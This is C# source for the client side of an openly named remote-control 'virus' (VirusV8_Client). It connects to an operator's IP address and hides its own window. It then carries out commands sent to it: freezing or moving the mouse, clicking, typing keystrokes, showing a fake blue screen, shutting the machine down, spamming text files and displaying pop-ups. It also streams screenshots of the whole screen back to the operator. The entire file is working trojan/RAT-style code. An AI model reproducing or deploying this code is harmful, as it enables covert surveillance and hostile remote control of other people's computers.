﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace VirusV8_Client
{
    public partial class Form1 : Form
    {
        MouseFreeze mouseFreeze;
        AutoEnter autoenter;
        AutoSpace autospace;
        ServerClient imagesender;
        String ip = "localhost";
       
        public Form1()
        {
            InitializeComponent();
            autoenter = new AutoEnter();
            autospace = new AutoSpace();
        }
        Socket s;
        private void timerTryConnect_Tick(object sender, EventArgs e)
        {
            try
            {
                Client client = new Client(ip, 1000);//IP CHANGE
                s = client.socket;
                timerTryConnect.Enabled = false;
                timerTryReceive.Enabled = true;
                
            }
            catch(Exception exe)
            {

            }
        }

        public byte[] receive()
        {
            try
            {
                int TimeOut = 500;
                int SleepTime = 50;
                int cnt = 0;
                MemoryStream mem = new MemoryStream();// Empfangspuffer
                byte[] buffer = new byte[1024];
                while (cnt < (TimeOut / SleepTime))
                {
                    while (s.Available > 0)
                    {
                        int bytesRead = s.Receive(buffer, buffer.Length, SocketFlags.None);
                        if (bytesRead <= 0) continue;
                        mem.Write(buffer, 0, bytesRead);
                    }
                    //Thread.Sleep(SleepTime);
                    if (mem.Length > 0 && s.Available == 0)
                    {
                        return mem.ToArray();
                    }
                    else
                    {
                        cnt++;
                    }
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        private void timerTryReceive_Tick(object sender, EventArgs e)
        {
            byte[] array = receive();
            if (array != null)
            {
                try
                {

                     string something = System.Text.Encoding.ASCII.GetString(array);
                    




                     switch(something)
                    {
                        case "MouseFreezeBottomLeft":
                            mouseFreeze=new MouseFreeze(5);
                            break;
                        case "MouseFreezeBottomRight":
                            mouseFreeze = new MouseFreeze(1);
                            break;
                        case "MouseFreezeMiddle":
                            mouseFreeze = new MouseFreeze(3);
                            break;
                        case "MouseFreezeTopLeft":
                            mouseFreeze = new MouseFreeze(4);
                            break;
                        case "MouseFreezeTopRight":
                            mouseFreeze = new MouseFreeze(2);
                            break;
                        case "MouseStopFreeze":
                            mouseFreeze.Stop();
                            break;
                        case "MouseKlick":
                            MouseKlick.DoMouseClick();
                            break;
                        case "MouseDoubleKlick":
                            MouseKlick.DoMouseDoubleClick();
                            break;
                        case "MouseDisable":
                           //sdfsdahj
                            break;
                        case "BlueScreen":
                            BlueScreen BLUUU = new BlueScreen();
                            BLUUU.ShowDialog();
                            break;
                        case "ShutDown":
                            new ShutDown();
                            break;
                        case "ExitVirus":
                            new ExitVirus();
                            break;
                        case "AutoEnterEnable":
                            autoenter.Enable();
                            break;
                        case "AutoEnterDisable":
                            autoenter.Disable();
                            break;
                        case "AutoSpaceEnable":
                            autospace.Enable();
                            break;
                        case "AutoSpaceDisable":
                            autospace.Disable();
                            break;
                        case "TXTSpam":
                            new Funktionen.TXTSpam();
                            break;
                    }


                    if (something.Contains("MouseSimulation"))
                    {
                        //MouseSimulation:123:12
                        try
                        {
                            string[] mousepositions = something.Split(':');
                            int X = Convert.ToInt32(Convert.ToDouble(mousepositions[1]) * Screen.PrimaryScreen.Bounds.Width);
                            int Y = Convert.ToInt32(Convert.ToDouble(mousepositions[2]) * Screen.PrimaryScreen.Bounds.Height);
                            Cursor.Position = new Point(X, Y);
                        }
                        catch
                        {

                        }
                    }

                    if (something.Contains("PopUpMessage"))
                    {
                        //PopUpMessage:Text
                        try
                        {
                            string[] Text = something.Split(':');
                            Form1.Vars.PopUpMessageText = Text[1];
                            Form1.Vars.Anzeigezeit = Convert.ToInt32(Text[2]);
                            PopUpMessageViewer PUMV = new PopUpMessageViewer();
                            PUMV.Show();
                        }
                        catch
                        {

                        }
                    }

                    if (something.Contains("SendText"))
                    {
                        //SendText:Text
                        try
                        {
                            string[] Text = something.Split(':');
                            SendKeys.Send(Text[1]);
                        }
                        catch
                        {

                        }
                    }
                }
                catch (Exception EX)
                {
                    MessageBox.Show("Fehler! : " + EX.Message);
                }
            }
            
        }

        public struct Vars
        {
            public static string PopUpMessageText;
            public static int Anzeigezeit;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                ip = textBox1.Text;
                if(textBox1.Text.Equals(""))
                { ip = "localhost"; }
                timerTryConnect.Enabled = true;
                this.Opacity = 0;
            }
            catch (Exception exe)
            {
                ip = "localhost";
                timerTryConnect.Enabled = true;
                this.Opacity = 0;
            }

            imagesender = new ServerClient(1001);


        }

        private void button192168178xx_Click(object sender, EventArgs e)
        {
            textBox1.Text = "192.168.178.";
        }

        private void button101000xx_Click(object sender, EventArgs e)
        {
            textBox1.Text = "10.100.0.";
        }

        private void TimerSend_Tick(object sender, EventArgs e)
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics mg = Graphics.FromImage(bmp);
                mg.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                imagesender.send(imageToByteArray(bmp));
            }
            catch (Exception EX)
            {

            }
        }

        public byte[] imageToByteArray(System.Drawing.Image imageIn)
        {
            MemoryStream ms = new MemoryStream();
            imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
            return ms.ToArray();
        }
    }
}
